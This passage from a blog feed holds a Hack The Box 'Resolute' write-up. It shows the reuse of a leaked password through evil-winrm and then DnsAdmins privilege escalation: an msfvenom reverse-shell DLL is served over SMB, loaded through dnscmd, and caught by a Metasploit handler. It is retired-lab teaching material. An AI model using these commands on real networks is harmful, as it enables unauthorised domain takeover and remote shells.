+&lt;span class="code-line"&gt;PS&amp;gt;CommandInvocation(Invoke-Expression): &amp;quot;Invoke-Expression&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;quot;Command&amp;quot;; value=&amp;quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then login with the ryan user still using
+&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u ryan -p &amp;#39;Serv3r4Admin4cc123!&amp;#39; -i 10.10.10.169&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\ryan\Desktop&amp;gt; type note.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Email to team:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We enumerate our new permissions. Using
+&lt;a href="https://github.com/BloodHoundAD/BloodHound"&gt;Bloodhound&lt;/a&gt; we see that we are part
+of the &lt;code&gt;DNSADMINS&lt;/code&gt; group.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Ryan's groups" src="/media/2020.05/resolute_2.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can confirm this by using &lt;code&gt;whoami /all&lt;/code&gt; (I remove the "SUID" and "Attributes"
+columns for more clarity).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt; whoami /all&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;User Name     SID&lt;/span&gt;
+&lt;span class="code-line"&gt;============= ==============================================&lt;/span&gt;
+&lt;span class="code-line"&gt;megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Group Name                                 Type&lt;/span&gt;
+&lt;span class="code-line"&gt;========================================== ================&lt;/span&gt;
+&lt;span class="code-line"&gt;Everyone                                   Well-known group&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Users                              Alias&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Pre-Windows 2000 Compatible Access Alias&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Remote Management Users            Alias&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\NETWORK                       Well-known group&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users           Well-known group&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\This Organization             Well-known group&lt;/span&gt;
+&lt;span class="code-line"&gt;MEGABANK\Contractors                       Group&lt;/span&gt;
+&lt;span class="code-line"&gt;MEGABANK\DnsAdmins                         Alias&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication           Well-known group&lt;/span&gt;
+&lt;span class="code-line"&gt;Mandatory Label\Medium Mandatory Level     Label&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
+&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
+&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;A few Google research allow us to find that being DNSAdmin allow for privilege
+escalation. The technique is to change the DNS configuration so it will load a
+DLL when starting the DNS service. We can either charge the DLL locally or
+remotely using SMB.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://adsecurity.org/?p=4064"&gt;https://adsecurity.org/?p=4064&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md"&gt;https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"&gt;http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"&gt;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In order to write the DLL we use &lt;code&gt;msfvenom&lt;/code&gt; with a classic reverse shell
+payload.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=&amp;quot;10.10.14.56&amp;quot; LPORT=4444 -f dll -o ~/srv/msf3.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We start our SMB server using
+&lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt; &lt;code&gt;smbserver.py&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python smbserver.py -ip 10.10.14.56 IOIO ~/srv/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Registry property serverlevelplugindll successfully reset.
+Command completed successfully. We start our handler using metasploit. And using
+our shell as &lt;code&gt;ryan&lt;/code&gt; we change the DNS configuration, stop the DNS service and
+start it back using &lt;code&gt;sc.exe&lt;/code&gt;. We can see in our SMB server's logs that our
+DLL is sent to the server. And we can see on our metasploit handler that we get
+a revershell. We can then easily get the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;::: text&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\ryan&amp;gt; dnscmd /config /serverlevelplugindll \\10.10.14.56\IOIO\msf3.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\ryan&amp;gt; sc.exe stop dns&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;SERVICE_NAME: dns&lt;/span&gt;
+&lt;span class="code-line"&gt;        TYPE               : 10  WIN32_OWN_PROCESS&lt;/span&gt;
+&lt;span class="code-line"&gt;        STATE              : 3  STOP_PENDING&lt;/span&gt;
+&lt;span class="code-line"&gt;                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)&lt;/span&gt;
+&lt;span class="code-line"&gt;        WIN32_EXIT_CODE    : 0  (0x0)&lt;/span&gt;
+&lt;span class="code-line"&gt;        SERVICE_EXIT_CODE  : 0  (0x0)&lt;/span&gt;
+&lt;span class="code-line"&gt;        CHECKPOINT         : 0x1&lt;/span&gt;
+&lt;span class="code-line"&gt;        WAIT_HINT          : 0x7530&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\ryan&amp;gt; sc.exe start dns&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;SERVICE_NAME: dns&lt;/span&gt;
+&lt;span class="code-line"&gt;        TYPE               : 10  WIN32_OWN_PROCESS&lt;/span&gt;
+&lt;span class="code-line"&gt;        STATE              : 2  START_PENDING&lt;/span&gt;
+&lt;span class="code-line"&gt;                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)&lt;/span&gt;
+&lt;span class="code-line"&gt;        WIN32_EXIT_CODE    : 0  (0x0)&lt;/span&gt;
+&lt;span class="code-line"&gt;        SERVICE_EXIT_CODE  : 0  (0x0)&lt;/span&gt;
+&lt;span class="code-line"&gt;        CHECKPOINT         : 0x0&lt;/span&gt;
+&lt;span class="code-line"&gt;        WAIT_HINT          : 0x7d0&lt;/span&gt;
+&lt;span class="code-line"&gt;        PID                : 4980&lt;/span&gt;
+&lt;span class="code-line"&gt;        FLAGS              :&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The metasploit handler is running simultaneously.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.56:4444&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Command shell session 2 opened (10.10.14.56:4444 -&amp;gt; 10.10.10.169:50613) at 2019-12-12 03:46:20 -0500&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
+&lt;span class="code-line"&gt;(c) 2016 Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;e1d94876a506850d0c20edb5405e619c&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;Getting the first user is quit easy if you use
+&lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt;. You can even spray
+the password by hand.
+The second user is just enumeration. It can take a long time before enumerating
+the right folder.
+The root part is quit interesting and let me learn a few things about DLL
+injection.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="DLL"></category><category term="DnsAdmins"></category></entry><entry><title>HTB: Obscurity</title><link href="https://maggick.fr/2020/05/htb-obscurity.html" rel="alternate"></link><published>2020-05-11T10:05:00+02:00</published><updated>2020-05-11T10:05:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-11:/2020/05/htb-obscurity.html</id><summary type="html">&lt;p&gt;&lt;img alt="Obscurity card" class="align-left" src="/media/2020.05/obscurity_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/219"&gt;Obscurity&lt;/a&gt;
 This box is classified as a medium machine. It was release on December the first
